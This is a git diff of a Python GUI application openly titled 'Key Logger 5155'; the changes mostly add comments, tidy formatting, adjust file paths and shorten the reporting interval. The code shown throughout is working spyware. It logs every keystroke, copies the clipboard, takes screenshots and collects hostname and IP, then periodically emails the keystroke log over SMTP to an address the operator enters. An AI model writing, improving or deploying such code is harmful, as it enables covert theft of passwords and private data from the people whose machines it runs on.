@@ -1,3 +1,4 @@
+# Import necessary libraries
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -13,35 +14,40 @@ import os
 from requests import get
 import threading
 from PIL import ImageGrab, Image, ImageTk
-from tkinter import Label,Frame, Entry, Button, messagebox,StringVar
+from tkinter import Label, Frame, Entry, Button, messagebox, StringVar
 from customtkinter import CTk
 import logging
 from dotenv import load_dotenv
+
+# Load environment variables
 load_dotenv()
-logging.basicConfig(filename="app/data/key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')
 
-keys_information = "app/data/key_log.txt"
-system_information = "app/data/systeminfo.txt"
-clipboard_information = "app/data/clipboard.txt"
-screenshot_information = "app/data/screenshot.png"
+# Configure logging
+logging.basicConfig(filename="data/key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')
 
-keys_information_e = "e_key_log.txt"
-system_information_e = "e_systeminfo.txt"
-clipboard_information_e = "e_clipboard.txt"
+# File paths for various log files
+keys_information = "data/key_log.txt"
+system_information = "data/systeminfo.txt"
+clipboard_information = "data/clipboard.txt"
+screenshot_information = "data/screenshot.png"
 
-email_address = os.getenv('email') 
+# Retrieve email and password from environment variables
+email_address = os.getenv('email')
 password = os.getenv('pass')
-toAddr = ""
 
+# Global variables for email sending
+toAddr = ""
 state = 0
 stopFlag = False
 
+# Function to handle closing of the application window
 def on_closing():
     global stopFlag
     if messagebox.askokcancel("Quit", "Do you want to quit?"):
         stopFlag = True
         root.destroy()
 
+# Function to send email with attachment
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
     msg = MIMEMultipart()
@@ -64,6 +70,7 @@ def send_email(filename, attachment, toaddr):
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
 
+# Function to gather system information
 def computer_information():
     with open(system_information, "a") as f:
         hostname = socket.gethostname()
@@ -81,8 +88,9 @@ def computer_information():
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
 
+# Function to copy clipboard content
 def copy_clipboard():
-   with open(clipboard_information, "a") as f:
+    with open(clipboard_information, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -93,14 +101,16 @@ def copy_clipboard():
         except:
             f.write("\nClipboard could be not be copied")
 
+# Function to take screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(screenshot_information)
-        
 
+# Global variables for key logging
 count = 0
-keys =[]
+keys = []
 
+# Function to handle key press event
 def on_press(key):
     global keys, count
     print(key)
@@ -109,17 +119,20 @@ def on_press(key):
     if count >= 1:
         count = 0
         write_file(keys)
-        keys =[]
+        keys = []
 
+# Function to write key logs to file
 def write_file(keys):
     for key in keys:
         k = str(key).replace("'", "")
         logging.info(k)
+
 listener = Listener(on_press=on_press)
 
+# Function to start keylogger
 def start_logger():
-    global listener,toAddr,btnStr
-    count = 900
+    global listener, toAddr, btnStr
+    count = 100
     listener.start()
     btnStr.set("Stop Keylogger")
     while True:
@@ -131,16 +144,21 @@ def start_logger():
         if (count == 0):
             screenshot()
             computer_information()
-            send_email(keys_information,keys_information,toAddr)
-            count = 900
+            if (email_address and password and toAddr!=""):
+                try:
+                    send_email(keys_information, keys_information, toAddr)
+                except:
+                    pass
+            count = 100
         sleep(1)
         count -= 1
     listener.stop()
     btnStr.set("Start Keylogger")
     listener = Listener(on_press=on_press)
 
+# Function to handle button click event
 def on_button_click():
-    global state,toAddr,listener,stopFlag,receiver_entry,btnStr
+    global state, toAddr, listener, stopFlag, receiver_entry, btnStr
     toAddr = receiver_entry.get()
     if (receiver_entry['state'] == 'normal'):
         receiver_entry['state'] = 'disabled'
@@ -148,39 +166,58 @@ def on_button_click():
     else:
         receiver_entry['state'] = 'normal'
         btnStr.set("Stopping...")
-    if state==0:
+    if state == 0:
         state = 1
         print(state)
         stopFlag = False
         thread = threading.Thread(target=start_logger)
         thread.start()
-    elif state==1:
-        state=0
+    elif state == 1:
+        state = 0
         print(state)
         stopFlag = True
-        btnStr.set("Start Keylogger") 
+        btnStr.set("Start Keylogger")
 
-root = CTk()
+# Create the root window
+root = CTk() #Creating root window using customTkinter, it allows to change color of Title bar unlike the official tkinter
 root.geometry("800x600")
 root.config(bg="black")
 root.protocol("WM_DELETE_WINDOW", on_closing)
+
+# Set initial button text
 btnStr = StringVar()
 btnStr.set("Start Keylogger")
-image = Image.open('app/cracking.png')
+
+# Load and set icon on Title bar
+root.after(201, lambda: root.iconbitmap('cracking.ico'))
+
+# Display an image
+image = Image.open('cracking.png')
 resize_image = image.resize((300, 300))
 img = ImageTk.PhotoImage(resize_image)
-root.after(201, lambda :root.iconbitmap('app/cracking.ico'))
-icon = Label(root, image=img, bg="black", width=300,height=400)
+icon = Label(root, image=img, bg="black", width=300, height=400)
 icon.pack()
+
+# Set window title
 root.title("Key Logger 5155")
-Title = Label(root, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"),pady=20, bg="black", fg="green")
+
+# Display title label
+Title = Label(root, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"), pady=20, bg="black", fg="green")
 Title.pack()
+
+# Frame for input widgets
 InputFrame = Frame(root, bg="black", pady=20)
 InputFrame.pack()
-receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"),pady=20, bg="black", fg="green")
+
+# Widgets for email address entry
+receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"), pady=20, bg="black", fg="green")
 receiver_entry = Entry(InputFrame, bg="black", fg="green", width=35, font=("Cascadia Code", 13, "bold"))
-receiver_entry.grid(row=0,column=1)
-receiver_label.grid(row=0,column=0)
-button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green",font=("Cascadia Code", 13, "bold") )
+receiver_entry.grid(row=0, column=1)
+receiver_label.grid(row=0, column=0)
+
+# Button to start/stop keylogger
+button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green", font=("Cascadia Code", 13, "bold"))
 button.pack()
+
+# Run the main event loop
 root.mainloop()
